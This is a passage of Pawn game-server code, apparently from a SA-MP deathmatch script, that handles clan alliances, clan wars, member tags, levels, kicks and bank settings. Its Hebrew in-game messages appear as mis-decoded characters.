								if(clanid == -1) return ClanDialog(playerid, clan_alliances), SendClientMessage(playerid, red, " .рє ўьря ьр фцющя р· фўьря ∙ьъ ьфёыэ с°щ·");
								if(playerinfo[playerid][clan] == clanid) return ClanDialog(playerid, clan_alliances), SendClientMessage(playerid,red," .рщя рЇ∙°х· ьсЎЄ р· фЇЄхьф фцх Єэ фўьря ∙ьъ");
								if(!claninfo[clanid][cask][playerinfo[playerid][clan]]) return ClanDialog(playerid, clan_alliances), SendClientMessage(playerid,red," .фўьря фцф ьр сщў∙ ∙ьхэ Єэ фўьря ∙ьъ");
								claninfo[clanid][cpeace][playerinfo[playerid][clan]] = false,
								claninfo[clanid][cask][playerinfo[playerid][clan]] = false,
								claninfo[playerinfo[playerid][clan]][cpeace][clanid] = false,
								claninfo[playerinfo[playerid][clan]][cask][clanid] = false;
								format(string,sizeof(string)," .ьр фёыщэ ь∙ьхэ %s юфўьря %s",claninfo[playerinfo[playerid][clan]][cname],GetName(playerid));
								for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && (playerinfo[i][clan] == clanid || playerinfo[i][clan] == playerinfo[playerid][clan])) SendClientMessage(i,red,string);
							}
							default: ClanDialog(playerid, clan_alliances);
						}
					}
					case clan_alliances_invite:
					{
						if(playerinfo[playerid][clan] == 0 || !claninfo[playerinfo[playerid][clan]][cvalid]) return 1;
						if(!HasClanPermission(playerid,clanperm_peace)) return 1;
						new cname2[M_S], idx, cmd[M_S];
						cname2 = strtok(inputtext,idx), cmd = strtok(inputtext,idx);
						if(!strlen(inputtext)) return SendClientMessage(playerid, red, " .рЁр фыЁё ∙э ўьря"), ClanDialog(playerid, clan_alliances_invite);
						new clanid = clannumber(cname2);
						if(clanid == -1) return SendClientMessage(playerid,red," .∙э ўьря ∙тхщ"), ClanDialog(playerid, clan_alliances_invite);
						if(!playerinfo[playerid][invitetime][0]) return ClanDialog(playerid, clan_alliances_invite), SendClientMessage(playerid,red," .·хыь ь∙ьхч фцюЁх· ∙хс сў°хс");
						new peaces = 0;
						for(new i=0;i<MAX_CLANS;i++) if(claninfo[i][cvalid] && claninfo[clanid][cpeace][i] && claninfo[i][cpeace][clanid]) peaces++;
						if(peaces >= MAX_CLANS-1) return ClanDialog(playerid, clan_alliances_invite), SendClientMessage(playerid,red," .ьўьря ∙ьъ щ∙ щх·° юущ с°щ·х· Єэ ўьрЁщэ рч°щэ");
						if(playerinfo[playerid][clan] == clanid) return ClanDialog(playerid, clan_alliances_invite), SendClientMessage(playerid,red," .рщя рЇ∙°х· ьсЎЄ р· фЇЄхьф фцх Єэ фўьря ∙ьъ");
						if(claninfo[playerinfo[playerid][clan]][cpeace][clanid]) return ClanDialog(playerid, clan_alliances_invite), SendClientMessage(playerid,red," .фўьря ∙ьъ ыс° с∙ьхэ Єэ фўьря фцф");
						new ocp = 0;
						for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && playerinfo[i][clan] == clanid) ocp++;
						if(!ocp) return ClanDialog(playerid, clan_alliances_invite), SendClientMessage(playerid,red," .рщя ∙чўЁщэ ючхс°щэ юўьря цф хьыя фсў∙ф ьр Ё∙ьчф");
						playerinfo[playerid][invitetime][0]--;
						format(string,sizeof(string)," .%s ,юЎщЄ ьыэ ∙ьхэ Єэ фўьря ∙ьх %s",claninfo[playerinfo[playerid][clan]][cname],GetName(playerid));
						for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && playerinfo[i][clan] == clanid) SendClientMessage(i,green,string);
						claninfo[playerinfo[playerid][clan]][cask][clanid] = true;
						format(string,sizeof(string)," .Ё∙ьчф %s фсў∙ф ∙ьъ ь∙ьхэ Єэ фўьря",claninfo[clanid][cname]);
						SendClientMessage(playerid,green,string);
						format(string,sizeof(string)," .%s сщў∙ ∙ьхэ Єэ фўьря %s",claninfo[clanid][cname],GetName(playerid));
						for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && playerinfo[i][clan] == playerinfo[playerid][clan] && i != playerid) SendClientMessage(i,green,string);
					}
					case clan_alliances_remove:
					{
						if(playerinfo[playerid][clan] == 0 || !claninfo[playerinfo[playerid][clan]][cvalid]) return 1;
						if(!HasClanPermission(playerid,clanperm_peace)) return 1;
						new cname2[M_S], ft[M_S], idx, cmd[M_S];
						cname2 = strtok(inputtext,idx), cmd = strtok(inputtext,idx);
						if(!strlen(inputtext)) return SendClientMessage(playerid, red, " .рЁр фыЁё ∙э ўьря"), ClanDialog(playerid, clan_alliances_invite);
						new clanid = clannumber(cname2);
						if(playerinfo[playerid][clan] == 0 || !claninfo[playerinfo[playerid][clan]][cvalid]) return 1;
						if(!HasClanPermission(playerid,clanperm_peace)) return 1;
						if(playerinfo[playerid][clan] == clanid) return ClanDialog(playerid, clan_alliances_remove), SendClientMessage(playerid,red," .рщя рЇ∙°х· ьсЎЄ р· фЇЄхьф фцх Єэ фўьря ∙ьъ");
						if(!claninfo[playerinfo[playerid][clan]][cpeace][clanid]) return ClanDialog(playerid, clan_alliances_remove), SendClientMessage(playerid,red," .фўьря ∙ьъ ьр с∙ьхэ Єэ фўьря фцф");
						claninfo[clanid][cpeace][playerinfo[playerid][clan]] = false,
						claninfo[clanid][cask][playerinfo[playerid][clan]] = false,
						claninfo[playerinfo[playerid][clan]][cpeace][clanid] = false,
						claninfo[playerinfo[playerid][clan]][cask][clanid] = false;
						format(ft,sizeof(ft),"/DM/Clans/%s.ini",claninfo[playerinfo[playerid][clan]][cname]);
						for(new i=0;i<MAX_CLANS;i++)
						{
							format(string,sizeof(string),"Peace%d",i);
							if(fkeyexist(ft,string) && equal(fgetstring(ft,string),claninfo[clanid][cname]))
							{
								fremovekey(ft,string);
								break;
							}
						}
						format(ft,sizeof(ft),"/DM/Clans/%s.ini",claninfo[clanid][cname]);
						for(new i=0;i<MAX_CLANS;i++)
						{
							format(string,sizeof(string),"Peace%d",i);
							if(fkeyexist(ft,string) && equal(fgetstring(ft,string),claninfo[playerinfo[playerid][clan]][cname]))
							{
								fremovekey(ft,string);
								break;
							}
						}
						format(string,sizeof(string)," .%s фхЇёў Єь щущщ %s х %s ф∙ьхэ сщя фўьрЁщэ",GetName(playerid),claninfo[playerinfo[playerid][clan]][cname],claninfo[clanid][cname]);
						for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && (playerinfo[i][clan] == clanid || playerinfo[i][clan] == playerinfo[playerid][clan])) SendClientMessage(i,red,string);
					}
					case clan_quit: if(response) PlayerLeaveClan(playerid, true, 0, 0);
					case clan_other: if(response)
					{
					    switch(listitem)
					    {
					        case 0: command(playerid,"/clans");
							case 1: command(playerid,"/hqlist");
							//case 2: ClanDialog(playerid, clan_cw);
					    }
					}
					case clan_cw: switch(listitem)
					{
					    case 0: ClanDialog(playerid, clan_cwinvite); // фцюЁф ьюьчюф
					    case 1: // рщ∙х° юьчюф
					    {
							if(claninfo[playerinfo[playerid][clan]][cinwar]) return ClanDialog(playerid, clan_cw), SendClientMessage(playerid,red," .фўьря ∙ьъ ыс° сюьчю· ўьрЁщэ");
							if(!claninfo[playerinfo[playerid][clan]][cwarasked][0]) return ClanDialog(playerid, clan_cw), SendClientMessage(playerid,red," .∙хэ ўьря ьр фцющя р· фўьря ∙ьъ ьюьчю· ўьрЁщэ");
							format(string,sizeof(string)," - рщ∙° р· юьчю· фўьрЁщэ %s юфўьря %s",claninfo[playerinfo[playerid][clan]][cname],GetName(playerid));
							for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && (playerinfo[i][clan] == playerinfo[playerid][clan] || playerinfo[i][clan] == claninfo[playerinfo[playerid][clan]][cwarasked][0])) SendClientMessage(i,green,string);
							new placeon = -1, cPlayer[MAX_PLAYERS], cPlayer2[MAX_PLAYERS], cPlayers[2], warworld = GetEmptyWorld();
							for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && (playerinfo[i][clan] == playerinfo[playerid][clan] || playerinfo[i][clan] == claninfo[playerinfo[playerid][clan]][cwarasked][0]) && CanBeTeleported(i)) if(playerinfo[i][clan] == playerinfo[playerid][clan]) cPlayer[cPlayers[0]++] = i; else cPlayer2[cPlayers[1]++] = i;
							if(cPlayers[0] < 2 || cPlayers[1] < 2)
							{
								for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && (playerinfo[i][clan] == playerinfo[playerid][clan] || playerinfo[i][clan] == claninfo[playerinfo[playerid][clan]][cwarasked][0]))
								{
									if(cPlayers[0] < 2 && cPlayers[1] < 2) SendClientMessage(playerid,red," :ь∙Ёщ фўьрЁщэ рщя юёЇщў ∙чўЁщэ");
									else
									{
										if(cPlayers[0] < 2) format(string,sizeof(string),claninfo[claninfo[playerinfo[playerid][clan]][cwarasked][0]][cname]);
										else format(string,sizeof(string),claninfo[playerinfo[playerid][clan]][cname]);
										format(string,sizeof(string)," :рщя юёЇщў ∙чўЁщэ %s ьўьря",string);
										SendClientMessage(i,red,string);
									}
									SendClientMessage(i,red," .Єь юЁ· ьўщщэ юьчю· ўьрЁщэ у°х∙щэ ьЇчх· ∙Ёщ ∙чўЁщэ (рчу юыь ўьря) ∙Ёщ·я ь∙т°");
								}
								return ClanDialog(playerid, clan_cw);
							}
							for(new j = 0; j < 2; j++)
							{
								format(string,sizeof(string)," .%s - Ўх°Ї· ьюьчю· ўьрЁщэ ўьрёщ· ьЎу фўьря ∙ьъ",!j ? (claninfo[playerinfo[playerid][clan]][cname]) : (claninfo[claninfo[playerinfo[playerid][clan]][cwarasked][0]][cname]));
								for(new i = 0, id; i < cPlayers[j]; i++)
								{
									placeon = placeon == sizeof(ClanWarPositions1) ? 0 : placeon + 1;
									id = !j ? cPlayer[i] : cPlayer2[i];
									SetPlayerPos(id,ClanWarPositions1[placeon][0],ClanWarPositions1[placeon][1],ClanWarPositions1[placeon][2]);
									SetPlayerFacingAngle(id,ClanWarPositions1[placeon][3]);
									SetPlayerHealth(id,100.0);
									SetPlayerArmour(id,100.0);
									ResetWeapons(id);
									GiveWeapon(id,24,10000);
									GiveWeapon(id,26,10000);
									GiveWeapon(id,28,10000);
									GiveWeapon(id,31,10000);
									GiveWeapon(id,34,10000);
									SetFreeze(id,1);
									SetPlayerVirtualWorld(id,warworld);
									SendClientMessage(id,green,string);
								}
							}
							claninfo[claninfo[playerinfo[playerid][clan]][cwarasked][0]][cwarasked][0] = playerinfo[playerid][clan];
							claninfo[claninfo[playerinfo[playerid][clan]][cwarasked][0]][cwarasked][1] = claninfo[playerinfo[playerid][clan]][cwarasked][1];
							claninfo[playerinfo[playerid][clan]][cinwar] = 1;
							claninfo[playerinfo[playerid][clan]][cwarcd] = 5;
							claninfo[playerinfo[playerid][clan]][cwarplayers] = cPlayers[0];
							claninfo[claninfo[playerinfo[playerid][clan]][cwarasked][0]][cinwar] = 1;
							claninfo[claninfo[playerinfo[playerid][clan]][cwarasked][0]][cwarplayers] = cPlayers[1];
							for(new i = 0; i < cPlayers[0]; i++) claninfo[playerinfo[playerid][clan]][cwarplayer][i] = cPlayer[i];
							for(new i = 0; i < cPlayers[1]; i++) claninfo[claninfo[playerinfo[playerid][clan]][cwarasked][0]][cwarplayer][i] = cPlayer2[i];
							SendClientMessageToAll(lightblue," ~~~ ...фчь ў°с ўьрЁщэ! схрх Ёчыф ь°рх· рщцф ўьря щЁЎч ~~~");
							format(string,sizeof(string)," - %s (%d) VS %s (%d) -",claninfo[playerinfo[playerid][clan]][cname],cPlayers[0],claninfo[claninfo[playerinfo[playerid][clan]][cwarasked][0]][cname],cPlayers[1]);
							SendClientMessageToAll(white,string);
							SetTimerEx("StartClanWar",1000,0,"i",playerinfo[playerid][clan]);
						}
						case 2: // cancel cw
						{
						    if(claninfo[playerinfo[playerid][clan]][cinwar]) return ClanDialog(playerid, clan_cw), SendClientMessage(playerid,red," .фўьря ∙ьъ ыс° сюьчю· ўьрЁщэ");
							if(!claninfo[playerinfo[playerid][clan]][cwarasked][0]) return ClanDialog(playerid, clan_cw), SendClientMessage(playerid,red," .∙хэ ўьря ьр фцющя р· фўьря ∙ьъ ьюьчю· ўьрЁщэ");
							format(string,sizeof(string)," - сщшь р· ффцюЁф ьў°с фўьрЁщэ %s юфўьря %s",claninfo[playerinfo[playerid][clan]][cname],GetName(playerid));
							for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][clan] == playerinfo[playerid][clan]) SendClientMessage(i,green,string);
							claninfo[claninfo[playerinfo[playerid][clan]][cwarasked][0]][cwarasked][0] = 0;
							claninfo[playerinfo[playerid][clan]][cwarasked][0] = 0;
						}
						case 3: // quit cw
						{
						    if(!claninfo[playerinfo[playerid][clan]][cinwar]) return ClanDialog(playerid, clan_cw), SendClientMessage(playerid,red," .фўьря ∙ьъ ьр сюьчю· ўьрЁщэ");
							format(string,sizeof(string)," .фЇёщў р· юьчю· фўьрЁщэ %s",GetName(playerid));
							for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && (playerinfo[i][clan] == playerinfo[playerid][clan] || playerinfo[i][clan] == claninfo[playerinfo[playerid][clan]][cwarasked][0])) SendClientMessage(playerid,red,string);
							EndClanWar(claninfo[playerinfo[playerid][clan]][cwarasked][0],playerinfo[playerid][clan],1);
						}
					}
					case clan_cwinvite:
					{
					    if(!inputtext[0]) return ClanDialog(playerid, clan_cwinvite, @c(red) "\n\nрЁр фўьу р· ∙э фўьря");
						new cid = clannumber(inputtext);
						if(!cid) return ClanDialog(playerid, clan_cwinvite, @c(red) "\n\nфўьря фцф ьр ўщщэ");
						format(string,sizeof(string)," - ьюьчю· ўьрЁщэ ўьрёщ· %s фцющя р· фўьря %s",claninfo[cid][cname],GetName(playerid));
						for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][clan] == playerinfo[playerid][clan]) SendClientMessage(i,green,string);
						format(string,sizeof(string)," - :юцющя р·ыэ ьюьчю· ўьрЁщэ ўьрёщ·, ьрщ∙х° %s юфўьря %s",claninfo[playerinfo[playerid][clan]][cname],GetName(playerid));
						for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][clan] == cid) SendClientMessage(i,green,string);
						for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][clan] == cid) SendClientMessage(i,green,"- /c > юьчюх· ўьрЁщэ\"");
						claninfo[cid][cwarasked][0] = playerinfo[playerid][clan];
						claninfo[cid][cwarasked][1] = 0;
					}
					case clan_viewmember: ClanDialog(playerid,clan_optmember);
					case clan_optmember:
					{
						switch(listitem)
						{
							case 0:
							{
								if(!HasClanPermission(playerid,clanperm_settag)) return 1;
								ClanDialog(playerid,clan_settag,ClanPList_Player(playerinfo[playerid][clan],playerinfo[playerid][clickon]));
							}
							case 1:
							{
								if(!HasClanPermission(playerid,clanperm_settag)) return 1;
								format(string,sizeof(string),ClanPList_Player(playerinfo[playerid][clan],playerinfo[playerid][clickon]));
								new id = ReturnClanUser(string,playerid);
								format(string,sizeof(string),"/DM/Users/%s.ini",ClanPList_Player(playerinfo[playerid][clan],playerinfo[playerid][clickon]));
								if(IsPlayerConnected(id))
								{
									if(!strlen(playerinfo[id][clantag])) return ClanDialog(playerid,clan_err,".ью∙·ю∙ цф рщя ·рт",clan_optmember);
									if(playerinfo[playerid][lclan] < playerinfo[id][lclan]) return ClanDialog(playerid,clan_err,".рщя ьъ ф°∙рф ьфёщ° ью∙·ю∙ цф р· ф·рт",clan_optmember);
									playerinfo[id][clantag][0] = 0;
								}
								else
								{
									securedSelect(string);
									if(!strlen(fgetstring(string,"ClanTag"))) return ClanDialog(playerid,clan_err,".ью∙·ю∙ цф рщя ·рт",clan_optmember);
									if(playerinfo[playerid][lclan] < fgetint(string,"ClanLevel")) return ClanDialog(playerid,clan_err,".рщя ьъ ф°∙рф ьфёщ° ью∙·ю∙ цф р· ф·рт",clan_optmember);
								}
								fsetstring(string,"ClanTag","X");
								ClanDialog(playerid,clan_not,@c(green) ".·рт фю∙·ю∙ Ёючў сфЎьчф",clan_optmember);
								format(string,sizeof(string)," * %s ючў р· ф·рт ∙ь %s",ClanPList_Player(playerinfo[playerid][clan],playerinfo[playerid][clickon]),GetName(playerid));
								ClanNotification(playerinfo[playerid][clan],string);
								PlaySound(playerid,1057);
							}
							case 2:
							{
								if(playerinfo[playerid][lclan] < 5) return ClanDialog(playerid,clan_err,".Єь юЁ· ьф∙·ю∙ срЇ∙°х· цх Єьщъ ьфщх· с°ю· тщ∙х· 5 ьЇчх·",clan_optmember);
								ClanDialog(playerid,clan_setlevel,ClanPList_Player(playerinfo[playerid][clan],playerinfo[playerid][clickon]));
							}
							case 3:
							{
								if(!HasClanPermission(playerid,clanperm_kick)) return 1;
								format(string,sizeof(string),ClanPList_Player(playerinfo[playerid][clan],playerinfo[playerid][clickon]));
								//new id = ReturnClanUser(string,playerid);
								//format(string,sizeof(string),"(?юфўьря %s ю·ыххя ьфхЎщр р· %s)",string,GetName(playerid));
								//for(new i = 0; i < claninfo[playerinfo[playerid][clan]][cmembers]; i++) if(claninfo[playerinfo[playerid][clan]][cplayers][i] != playerid && claninfo[playerinfo[playerid][clan]][cplayers][i] != id) SendClientMessage(claninfo[playerinfo[playerid][clan]][cplayers][i],grey,string);
								ClanDialog(playerid,clan_kick,ClanPList_Player(playerinfo[playerid][clan],playerinfo[playerid][clickon]));
							}
						}
					}
					case clan_settag:
					{
						if(!HasClanPermission(playerid,clanperm_settag)) return 1;
						if(!strlen(inputtext)) return ClanDialog(playerid,clan_err,".ьр фўьу· ·рт");
						if(strlen(inputtext) > 12) return ClanDialog(playerid,clan_err,".Єьщъ ьфўьщу ·рт срх°ъ Ёюхъ ю-12 ·хщэ");
						format(string,sizeof(string),ClanPList_Player(playerinfo[playerid][clan],playerinfo[playerid][clickon]));
						new id = ReturnClanUser(string,playerid);
						format(string,sizeof(string),"/DM/Users/%s.ini",string);
						if(IsPlayerConnected(id))
						{
							if(playerinfo[playerid][lclan] < playerinfo[id][lclan]) return ClanDialog(playerid,clan_err,".рщя ьъ ф°∙рф ь∙Ёх· ью∙·ю∙ цф р· ф·рт",clan_optmember);
							format(playerinfo[id][clantag],16,inputtext);
						}
						else
						{
							securedSelect(string);
							if(playerinfo[playerid][lclan] < fgetint(string,"ClanLevel")) return ClanDialog(playerid,clan_err,".рщя ьъ ф°∙рф ь∙Ёх· ью∙·ю∙ цф р· ф·рт",clan_optmember);
							SaveData("message",playerid,ClanPList_Player(playerinfo[playerid][clan],playerinfo[playerid][clickon]),"∙щЁф ьъ р· ф·рт сўьря ы∙ьр фщщ· ючхс°");
						}
						fsetstring(string,"ClanTag",inputtext);
						format(string,sizeof(string),@c(green) ":·рт фю∙·ю∙ ∙хЁф сфЎьчф ь\n%s",inputtext);
						ClanDialog(playerid,clan_not,string,clan_optmember);
						format(string,sizeof(string)," * :ь %s ∙щЁф р· ф·рт ∙ь %s",ClanPList_Player(playerinfo[playerid][clan],playerinfo[playerid][clickon]),GetName(playerid));
						ClanNotification(playerinfo[playerid][clan],string);
						ClanNotification(playerinfo[playerid][clan],inputtext);
						PlaySound(playerid,1057);
					}
					case clan_setlevel:
					{
						if(playerinfo[playerid][lclan] < 5) return ClanDialog(playerid,clan_err,".Єь юЁ· ьф∙·ю∙ срЇ∙°х· цх Єьщъ ьфщх· с°ю· тщ∙х· 5 ьЇчх·",clan_optmember);
						if(!strlen(inputtext)) return ClanDialog(playerid,clan_err,".ьр фўьу· ·рт");
						format(string,sizeof(string),ClanPList_Player(playerinfo[playerid][clan],playerinfo[playerid][clickon]));
						new id = ReturnClanUser(string,playerid), lvl = strval(inputtext);
						format(string,sizeof(string),"/DM/Users/%s.ini",string);
						securedSelect(string);
						if(lvl < 1 || lvl > 5) return ClanDialog(playerid,clan_err,".ф°юф Ў°щыф ьфщх· сщя 1 ь-5");
						fsetint(string,"ClanLevel",lvl);
						format(string,sizeof(string),@c(green) ".°ю· фтщ∙х· ∙ь фю∙·ю∙ ∙хЁ·ф ь-%d",lvl);
						ClanDialog(playerid,clan_not,string,clan_optmember);
						format(string,sizeof(string)," * ь-%d %s ∙щЁф р· °ю· фтщ∙х· ∙ь %s",lvl,ClanPList_Player(playerinfo[playerid][clan],playerinfo[playerid][clickon]),GetName(playerid));
						ClanNotification(playerinfo[playerid][clan],string);
						if(IsPlayerConnected(id))
						{
							playerinfo[id][lclan] = lvl;
							SendClientMessage(id,yellow," (/clevel :ыущ ь°рх· юф фф°∙рх· ∙ьъ ы°тЄ)");
						}
						else
						{
							format(string,sizeof(string),"∙щЁф ьъ р· ф°юф сўьря сцюя ∙ьр фщщ· ючхс°, ь°юф %d",lvl);
							SaveData("message",playerid,ClanPList_Player(playerinfo[playerid][clan],playerinfo[playerid][clickon]),string);
						}
						PlaySound(playerid,1057);
					}
					case clan_kick:
					{
						if(!HasClanPermission(playerid,clanperm_kick)) return 1;
						new hisName[MAX_PLAYER_NAME];
						format(hisName,sizeof(hisName),ClanPList_Player(playerinfo[playerid][clan],playerinfo[playerid][clickon]));
						new id = ReturnClanUser(hisName,playerid);
						if(IsPlayerConnected(id))
						{
							if(id == playerid) return ClanDialog(playerid,clan_err,".рщЁъ щыхь ьфхЎщр р· ЄЎюъ. ф∙·ю∙ срхЇЎщщ· фЇ°щ∙ф с·Ї°щш ф°р∙щ",clan_optmember);
							if(playerinfo[playerid][lclan] < playerinfo[id][lclan]) return ClanDialog(playerid,clan_err,".рщя ьъ ф°∙рф ьфхЎщр юфўьря р· фю∙·ю∙ фцф",clan_optmember);
							PlayerLeaveClan(id,true,.reason = 1);
						}
						else
						{
							format(string,sizeof(string),"/DM/Users/%s.ini",hisName);
							securedSelect(string);
							if(playerinfo[playerid][lclan] < fgetint(string,"ClanLevel")) return ClanDialog(playerid,clan_err,".рщя ьъ ф°∙рф ьфхЎщр юфўьря р· фю∙·ю∙ фцф",clan_optmember);
							format(string,sizeof(string),"ы∙ьр фщщ· ючхс° %s фхЎщр рх·ъ юфўьря",claninfo[playerinfo[playerid][clan]][cname]);
							SaveData("message",playerid,ClanPList_Player(playerinfo[playerid][clan],playerinfo[playerid][clickon]),string);
						}
						format(string,sizeof(string),"/DM/Users/%s.ini",hisName);
						ClanPList_Del(playerinfo[playerid][clan],hisName);
						fsetint(string,"ClanCode",0);
						fsetint(string,"ClanLevel",1);
						fsetstring(string,"ClanTag","x");
						if(IsPlayerConnected(id))
						{
							format(string,sizeof(string),"{%s}.%s Єь щущ фю∙·ю∙ %s фхЎр· юфўьря",ClanHexColor(playerinfo[playerid][clan]),GetName(playerid),claninfo[playerinfo[playerid][clan]][cname]);
							ShowPlayerDialog(id,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "щЎщрф юфўьря",string,"OK","");
						}
						format(string,sizeof(string),@c(green) ".фхЎр юфўьря %s",hisName);
						ClanDialog(playerid,clan_not,string,clan_main);
						format(string,sizeof(string)," * %s фхЎр юфўьря Єь щущ %s",GetName(playerid),hisName);
						CloseClanMenu(playerinfo[playerid][clan],"рчу ю∙чўЁщ фўьря фхЎр ююЁх",true,playerid);
						PlaySound(playerid,1057);
					}
					case clan_addmember:
					{
						if(!HasClanPermission(playerid,clanperm_invite)) return 1;
						if(!playerinfo[playerid][invitetime][0]) return ClanDialog(playerid,clan_err,".·хыь ь∙ьхч фцюЁх· ∙хс сў°хс",clan_allmembers);
						if(!strlen(inputtext)) return ClanDialog(playerid,clan_addmember,@c(red) ".ьр фўьу· ыьхэ");
						new id = ReturnUser(inputtext,playerid);
						if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return ClanDialog(playerid,clan_addmember,@c(red) ".ф∙чўя ∙°∙ю· ∙тхщ");
						if(id == playerid) return ClanDialog(playerid,clan_addmember,@c(red) ".рщЁъ щыхь ьфцющя р· ЄЎюъ");
						if(!playerinfo[id][logged]) return ClanDialog(playerid,clan_addmember,@c(red) ".Ёщ·я ьфцющя °ў ю∙·ю∙щэ °∙хющэ ь∙°·");
						if(playerinfo[id][clan] > 0)
						{
							if(playerinfo[id][clan] == playerinfo[playerid][clan]) return ClanDialog(playerid,clan_addmember,@c(red) ".ф∙чўя ∙°∙ю· ыс° ЁюЎр сўьря ∙ьъ");
							else
							{
								format(string,sizeof(string),@c(red) ".%s ф∙чўя ∙°∙ю· ыс° ЁюЎр сўьря",claninfo[playerinfo[id][clan]][cname]);
								return ClanDialog(playerid,clan_addmember,string);
							}
						}
						if(playerinfo[id][gang] > 0) return ClanDialog(playerid,clan_addmember,@c(red) ".ю∙·ю∙ цф сыЁхЇщщф хьыя ьр Ёщ·я ьфцющя рх·х");
						playerinfo[playerid][invitetime][0]--;
						format(string,sizeof(string),@c(green) ".ьўьря %s-Ё∙ьчф фцюЁф ь",GetName(id));
						ClanDialog(playerid,clan_not,string);
						format(string,sizeof(string)," * %s-∙ьч фцюЁф ьўьря ∙ьъ ь %s",GetName(id),GetName(playerid));
						ClanNotification(playerinfo[playerid][clan],string);
						format(string,sizeof(string),"{%s}!юцющя рх·ъ ьфЎш°є ьўьря ∙ьх %s юфўьря %s\n?фрэ с°ЎхЁъ ьфЎш°є",ClanHexColor(playerinfo[playerid][clan]),claninfo[playerinfo[playerid][clan]][cname],GetName(playerid));
						ShowPlayerDialog(id,dialog_claninvite,DIALOG_STYLE_MSGBOX,@c(lightblue) "фцюЁф ьўьря",string,"фЎш°Їх·","учщщф");
						playerinfo[id][iclan] = playerinfo[playerid][clan];
					}
					case clan_onlinemembers:
					{
						new c = 0, pla = -1;
						for(new i = 0; i < claninfo[playerinfo[playerid][clan]][cmembers]; i++)
						{
							if(c == listitem) pla = claninfo[playerinfo[playerid][clan]][cplayers][i];
							c++;
						}
						if(pla != -1) ClanDialog(playerid,clan_viewmember,GetName(pla),clan_onlinemembers);
					}
					case clan_edit:
					{
						switch(listitem)
						{
							case 0: // onfoot teleport
							{
								if(!HasClanPermission(playerid,clanperm_edit)) return 1;
								if(!claninfo[playerinfo[playerid][clan]][hashq]) return ClanDialog(playerid,clan_err,".ьўьря ∙ьъ рщя юЇўуф, ьр Ёщ·я ьўсхЄ ∙щтх°");
								playerinfo[playerid][selectingpos][1] = 1, playerinfo[playerid][selectingpos][2] = clan_edit;
								ClanDialog(playerid,clan_selectpos,"∙щтх°",clan_edit);
							}
							case 1: // vehicle teleport
							{
								if(!HasClanPermission(playerid,clanperm_edit)) return 1;
								if(!claninfo[playerinfo[playerid][clan]][hashq]) return ClanDialog(playerid,clan_err,".ьўьря ∙ьъ рщя юЇўуф, ьр Ёщ·я ьўсхЄ ∙щтх°");
								playerinfo[playerid][selectingpos][1] = 2, playerinfo[playerid][selectingpos][2] = clan_edit;
								ClanDialog(playerid,clan_selectpos,"∙щтх° с°ыс",clan_edit);
							}
							case 2: // command
							{
								if(!HasClanPermission(playerid,clanperm_edit)) return 1;
								ClanDialog(playerid,clan_editcmd);
							}
							case 3: // bank lock
							{
								if(!HasClanPermission(playerid,clanperm_edit)) return 1;
								//if(claninfo[playerinfo[playerid][clan]][ccp] == -1) return ClanDialog(playerid,clan_err,".ьўьря ∙ьъ рщя сЁў ўьря");
								claninfo[playerinfo[playerid][clan]][clbank] = _:(!(bool:claninfo[playerinfo[playerid][clan]][clbank]));
								fsetint(f,"LockBank",claninfo[playerinfo[playerid][clan]][clbank]);
								ClanDialog(playerid,clan_not,claninfo[playerinfo[playerid][clan]][clbank] ? (".сЁў фўьря ЁЁЄь сфЎьчф") : (".сЁў фўьря ЁЇ·ч сфЎьчф"),clan_edit);
								format(string,sizeof(string)," * %s р· сЁў фўьря %s",claninfo[playerinfo[playerid][clan]][clbank] ? ("ЁЄь") : ("Ї·ч"),GetName(playerid));
								ClanNotification(playerinfo[playerid][clan],string);
								PlaySound(playerid,1057);
							}
							case 4: // bank pos
							{
								if(playerinfo[playerid][logged]) return ClanDialog(playerid,clan_err," /bank - ∙щюх∙ ссЁў фўьря");
								if(!HasClanPermission(playerid,clanperm_bank)) return 1;
								//if(claninfo[playerinfo[playerid][clan]][ccp] == -1) return ClanDialog(playerid,clan_err,".ьўьря ∙ьъ рщя сЁў ўьря");
								playerinfo[playerid][selectingpos][1] = 3, playerinfo[playerid][selectingpos][2] = clan_edit;
								ClanDialog(playerid,clan_selectpos,"сЁў",clan_edit);
							}
							case 5: // bank history
							{
								//if(claninfo[playerinfo[playerid][clan]][ccp] == -1) return ClanDialog(playerid,clan_err,".ьўьря ∙ьъ рщя сЁў ўьря");
								ClanDialog(playerid,clan_bankhistory);
							}
							case 6: // gang zone size
							{
							    if(playerinfo[playerid][logged]) return ClanDialog(playerid,clan_err," .рхЇЎщф цх чёхюф");
								if(!HasClanPermission(playerid,clanperm_gzone)) return 1;
								ClanDialog(playerid,clan_editgangzone);
							}
						}
					}
					case clan_selectpos:
					{
						playerinfo[playerid][selectingpos][0] = listitem;
						switch(listitem)
						{
							case 0: /* current */
							{
								new Float:p[3];
								GetPlayerPos(playerid,p[0],p[1],p[2]);
								DoneSelectingPos(playerid,p[0],p[1],p[2]);
							}
							case 1: /* ingame */ ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "счщ°· ющўхэ у°ъ сю∙чў",@c(green) ":∙щэ ьс" @c(yellow) "\n\n.Y Єьщъ ььы· ьющўхэ ∙р·ф юЄхЁщщя ьсчх° хрц ььчхї сюўьу· Єь юў∙\n.N ыущ ьр ь∙Ёх· ющўхэ, ьчї","OK","");
